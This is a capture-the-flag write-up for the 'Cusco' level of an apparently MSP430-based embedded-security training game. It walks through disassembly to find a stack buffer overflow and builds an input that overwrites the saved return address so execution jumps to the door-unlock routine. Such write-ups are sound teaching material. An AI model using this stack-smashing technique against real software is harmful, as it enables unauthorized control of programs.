# Cusco

## solution

Lets go through the functions, starting with main.


```
4438 <main>
4438:  b012 0045      call	#0x4500 <login>
```


This is the same as hanoi. A theme in this challenge. Lets follow the trail.


```
4500 <login>
4500:  3150 f0ff      add	#0xfff0, sp
4508:  b012 a645      call	#0x45a6 <puts>
450c:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4510:  b012 a645      call	#0x45a6 <puts>
4514:  3e40 3000      mov	#0x30, r14
4518:  0f41           mov	sp, r15
451a:  b012 9645      call	#0x4596 <getsn>
451e:  0f41           mov	sp, r15
4520:  b012 5244      call	#0x4452 <test_password_valid>
4524:  0f93           tst	r15
4526:  0524           jz	#0x4532 <login+0x32>
4528:  b012 4644      call	#0x4446 <unlock_door>
452c:  3f40 d144      mov	#0x44d1 "Access granted.", r15
4530:  023c           jmp	#0x4536 <login+0x36>
4532:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4536:  b012 a645      call	#0x45a6 <puts>
453a:  3150 1000      add	#0x10, sp
453e:  3041           ret
```


This is also similar to Hanoi, except that our win condition is different. Working backwards, the instruction at address `0x4526` must not be triggered since that would jump to address `0x4532`. So the contents of `r15` must be non-zero. With this in mind, lets go through the `getsn` function call at address `0x451a` since that yielded something interesting last time.

Initially we can see `r14` and `r15` are arguments, same as before, except the contents are different. `r15` contains the stack pointer address, and `r14` contains 0x30. Lets go through the function `getsn`.


```
4596 <getsn>
4596:  0e12           push	r14
4598:  0f12           push	r15
459a:  2312           push	#0x2
459c:  b012 4245      call	#0x4542 <INT>
45a0:  3150 0600      add	#0x6, sp
45a4:  3041           ret
```


This is the same as Hanoi. the 0x2 interrupt is called with `r14` and `r15` passed as arguments. We know this will read a specific number of bytes to standard input, specifically it will read 48 characters (0x30) to the the address of where the stack pointer was. If we take a step back and go to the debugger console


```
$ c
```


To trigger the enter password prompt. We see that, similar to Hanoi, the prompt states the passwords are between 8 and 16 characters. We know that the `getsn` reads 48 characters. However we know that Cusco is not vulnerable to the same bug as Hanoi as the `login` does not contain the same compare instructions; it is only testing the contents of `r15`. Given we know the length of the input read, lets test it. If we enter a 48 length string, such as `000000000000000000000000000000000000000000000000`, we observe the error `insn address unaligned` in the debugger console. If we scroll up in the disassembly, we see something very interesting.



```
0010 <__trap_interrupt>
0010:  3041           ret
4400 <__init_stack>
    [overwritten]
4404 <__low_level_init>
    [overwritten]
    [overwritten]
    [overwritten]
440e <__do_copy_data>
    [overwritten]
    [overwritten]
    [overwritten]
    [overwritten]
    [overwritten]
    [overwritten]
4422:  f923           jnz	#0x4416 <__do_copy_data+0x8>
```


We seem to have overwritten parts of memory at the stack pointer upon entering this long password. This is a buffer overflow. This is powerful because it means we can change the win condition.

Our goal is now to overwrite some memory address to jump to the address we want, rather than having to follow the traditional flow of the program. To gain access to the system, we need to jump to address `0x4528` where the `unlock_door` function is called. The address we want to overwrite will be at the return of the `login` function, since that function has already been declared after the declaration of the buffer and the return is designed to take the instruction pointer back to main.


This can be observed by setting a breakpoint at the return of the `login` after entering the password, and observing the location of the stack pointer in the memory dump. The address of the sp is `0x43fe`. The password we entered takes up the addresses from `0x43ee` to `0x441d`. We want to change the contents of the stack pointer address. To do this with our password, we need to offset the payload. This offset is `0x43fe - 0x43ee = 0x10`, which is 16 characters. So we know the offset for the payload, and we know the payload is the address `0x4528` or `0x2845` in little-endian. As such, the final password to gain access is `000000000000000000000000000000002845`. Although the I/O console will say the password is incorrect, the door will be unlocked.

